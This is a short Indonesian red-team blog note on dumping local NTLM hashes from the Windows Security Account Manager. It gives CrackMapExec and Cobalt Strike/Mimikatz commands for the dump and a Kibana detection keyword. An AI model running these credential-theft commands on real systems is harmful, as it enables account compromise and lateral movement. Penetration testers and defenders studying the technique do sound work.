---
title: '[Credential Theft] Security Account Manager'
date: 2023-07-29 11:44:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, credential theft, mimikatz, cobalt strike, sam]     # TAG names should always be lowercase
author: nairpaa
---

**Security Account Manager (SAM)** adalah database di sistem operasi Windows yang menyimpan pengguna lokal dan kredensial terkait. 

*Hash* NTLM dari akun lokal ini dapat diekstraksi dengan modul Mimikatz `lsadump::sam`. Jika kredensial administrator lokal digunakan pada seluruh lingkungan, ini dapat membuat *lateral movement* menjadi sangat mudah.

## 0x1 - Exploitation Stages

> Perintah ini memerlukan hak akses yang lebih tinggi.
{: .prompt-warning }

### A. CrackMapExec

```bash
➜ crackmapexec smb <IP> -u <User> -p <Password> --sam
➜ crackmapexec smb <IP> -u <User> -p <Password> --sam --local-auth
```

### B. Beacon + Mimikatz

```powershell
beacon> mimikatz !lsadump::sam
```

> **OPSEC**
> 
> Modul Mimikatz ini akan membuka *handle* ke *SAM registry hive*. 
> 
> Kita bisa menggunakan kata kunci "`Suspicious SAM Hive Handle`" pada Kibana untuk melihat *log* ini.
{: .prompt-danger }

---

## 0x2 - References

- https://adsecurity.org/?page_id=1821
- https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
- https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/security-account-manager-sam